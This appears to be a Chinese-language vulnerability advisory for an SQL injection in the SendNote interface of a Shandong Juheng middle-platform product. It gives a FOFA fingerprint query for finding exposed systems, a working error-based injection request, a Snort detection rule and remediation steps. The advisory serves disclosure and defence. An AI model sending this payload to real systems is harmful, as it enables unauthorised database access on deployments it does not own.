# 山东聚恒网络技术有限公司聚恒中台SendNote存在SQL注入漏洞

山东聚恒网络技术有限公司聚恒中台SendNote存在SQL注入漏洞

# 影响版本

目前已有版本

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**fofa:**  **icon_hash=&quot;-2049533275&quot; || icon_hash=&quot;-737808640&quot; || icon_hash=&quot;-1557056363&quot;**

**POC/EXP：**

**step1** **sql注入**

```
POST /sysplat/dataget/data.ashx?type=SendNote HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Connection: close

noteid=1' and 1=(convert(int,@@version))--
```

​![image](assets/image-20260902010117-7p9kzo2.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"聚恒中台 - /sysplat/dataget/data.ashx SendNote SQL注入漏洞 (Error-based)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/sysplat/dataget/data.ashx"; fast_pattern;
    http.uri; content:"type=SendNote"; distance:0; nocase;
    http.content_type; content:"application/x-www-form-urlencoded";
    http.request_body; content:"noteid="; nocase;
    http.request_body; content:"convert(int,@@version)"; distance:0; nocase;
    metadata:
        service http,
        affected_product "聚恒中台",
        vulnerability_type "SQL Injection (Error-based)",
        severity "critical";
    classtype:web-application-attack;
    sid:1000754;
    rev:1;
    priority:1;
)
```

# 漏洞修复

1. **首选方案：联系厂商升级**  
    这是最彻底的修复方式。建议联系**山东聚恒网络技术有限公司**官方获取补丁或升级到最新安全版本。官方网址为：[`www.focusinsoft.com`](http://www.focusinsoft.com/)​。
2. **临时加固措施**

    * **部署WAF规则**：在Web应用防火墙（WAF）上配置规则，**拦截对**  **​`/sysplat/dataget/data.ashx`​**​ **接口的异常请求**。
    * **限制网络访问**：通过防火墙策略，**限制该系统仅允许内网或特定可信IP访问**，避免直接暴露在公网。
    * **加强监控审计**：**检查系统访问日志**，重点排查对该接口的可疑访问，尤其是包含SQL注入特征的请求。

‍
